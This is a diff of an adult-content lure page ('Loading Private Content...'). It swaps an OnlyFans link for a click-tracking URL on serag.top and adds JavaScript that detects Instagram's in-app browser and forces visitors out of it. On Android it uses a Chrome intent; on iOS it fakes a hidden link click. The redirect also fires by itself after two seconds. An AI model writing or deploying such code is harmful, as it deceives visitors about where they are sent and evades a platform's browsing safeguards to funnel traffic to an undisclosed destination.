@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="2; url=https://onlyfans.com/lexyy_grey/c176">
     <title>lexyy_grey</title>
     <style>
         /* Reset and Fonts */
@@ -79,6 +78,7 @@
             box-shadow: 0 10px 20px rgba(255, 0, 85, 0.3);
             transition: transform 0.2s, box-shadow 0.2s;
             animation: pulse 1.5s infinite;
+            cursor: pointer;
         }
 
         .btn:hover {
@@ -107,10 +107,68 @@
         <h1>Loading Private Content...</h1>
         <p>If the page does not open automatically:</p>
 
-        <a href="https://onlyfans.com/lexyy_grey/c176" class="btn">
+        <!-- Добавлен вызов функции onclick -->
+        <a href="https://serag.top/click?o=2&a=3126" class="btn" onclick="redirectOut(event, this.href)">
             ENTER NOW
         </a>
     </div>
+
+    <!-- Скрипт для выхода из встроенного браузера -->
+    <script>
+        function redirectOut(event, url) {
+            if (event) {
+                event.preventDefault(); // Останавливаем обычный клик, если функция вызвана нажатием кнопки
+            }
+
+            var fullUrl = url;
+            // Убираем протокол для формирования ссылки-интента
+            var targetDomainAndPath = fullUrl.replace(/^https?:\/\//, '');
+            
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isInstagram = (ua.indexOf('Instagram') > -1);
+            var isAndroid = /android/i.test(ua);
+            var isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+
+            if (isInstagram) {
+                if (isAndroid) {
+                    // Агрессивный редирект для Android через Chrome Intent
+                    var intentUrl = "intent://" + targetDomainAndPath + "#Intent;scheme=https;package=com.android.chrome;end;";
+                    window.location.replace(intentUrl);
+                    
+                    // Если Chrome не установлен, открываем обычную ссылку
+                    setTimeout(function() {
+                        window.location.replace(fullUrl);
+                    }, 500);
+                } 
+                else if (isIOS) {
+                    // Эмуляция клика по скрытому элементу для iOS Safari
+                    try {
+                        var a = document.createElement('a');
+                        a.href = fullUrl;
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        var e = document.createEvent('MouseEvents');
+                        e.initEvent('click', true, true);
+                        a.dispatchEvent(e);
+                    } catch (err) {}
+
+                    // Запасной метод
+                    setTimeout(function() {
+                        window.location.href = fullUrl;
+                    }, 300);
+                }
+            } else {
+                // Обычный редирект, если уже вне инстаграма
+                window.location.replace(fullUrl);
+            }
+        }
+
+        // Автоматический запуск скрипта через 2 секунды (вместо удаленного тега meta refresh)
+        setTimeout(function() {
+            var targetUrl = "https://serag.top/click?o=2&a=3126";
+            redirectOut(null, targetUrl);
+        }, 2000);
+    </script>
 
 </body>
 </html>
